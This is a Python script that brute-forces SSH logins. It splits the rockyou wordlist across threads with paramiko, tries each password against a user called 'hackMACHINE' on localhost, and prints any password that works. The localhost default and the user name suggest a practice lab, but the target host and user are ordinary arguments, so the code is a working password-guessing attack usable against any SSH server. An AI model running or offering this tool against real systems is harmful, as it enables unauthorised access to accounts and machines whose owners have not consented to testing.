import paramiko
import threading

# Load the list of passwords
def load_passwords(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        return [line.strip() for line in file.readlines()]

# Function to attempt SSH connection
def attempt_ssh(user, password, host='localhost', port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password, port=port)
        return password, True
    except paramiko.AuthenticationException:
        return password, False
    finally:
        client.close()

# Worker thread function to try passwords
def worker(user, host, passwords, result):
    for password in passwords:
        pwd, success = attempt_ssh(user, password, host)
        if success:
            result['password'] = pwd
            result['success'] = True
            break

# Main function to brute-force
def brute_force(user='hackMACHINE', password_file='assets/rockyou.txt', host='localhost', threads=2):
    passwords = load_passwords(password_file)
    result = {'password': None, 'success': False}
    
    # Split the password list into chunks for threading
    chunk_size = len(passwords) // threads
    threads_list = []
    
    for i in range(threads):
        password_chunk = passwords[i * chunk_size: (i + 1) * chunk_size]
        thread = threading.Thread(target=worker, args=(user, host, password_chunk, result))
        threads_list.append(thread)
        thread.start()

    for thread in threads_list:
        thread.join()

    return result


result = brute_force()
if result['success']:
    print(f"Success! Password: {result['password']}")
else:
    print("Brute-force failed.")
